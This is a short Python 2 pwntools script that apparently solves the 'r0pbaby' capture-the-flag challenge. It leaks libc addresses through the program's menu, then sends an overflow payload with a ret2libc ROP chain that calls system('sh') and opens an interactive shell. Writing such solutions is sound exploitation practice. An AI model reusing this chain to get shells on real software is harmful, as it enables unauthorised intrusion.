from pwn import *

r = process('./r0pbaby')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.endian = "little"
context.arch = "amd64"

padding = "a"*8
pop_rdi_ret_off = 0x21102 


r.recvuntil('Menu:')

def leak_libc():
    r.recvuntil(': ')
    r.sendline('1')
    return r.recvuntil('\n')

def leak_func(symbol):
    r.recvuntil(': ')
    r.sendline('2')
    r.recvuntil('Enter symbol: ')
    r.sendline(symbol)
    return r.recvline()

def out():
    print r.recvuntil(': ')    
    r.sendline('4')
    r.recvuntil('.')

def sendbytes(byte, payload):
    r.recvuntil(': ')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(byte + 1))
    r.sendline(payload)

base = leak_libc()[-19:-1]
libc_start_main = leak_func("__libc_start_main")
print libc_start_main

libc_base = int(libc_start_main[-19:-1], 16) - libc.symbols['__libc_start_main']
print hex(libc_base)

system = libc_base + libc.symbols['system']
print hex(system)

sh = libc_base + next(libc.search("sh\x00"))

sendbytes(32, padding + p64(libc_base + pop_rdi_ret_off) + p64(sh) + p64(system))
out()
r.interactive()
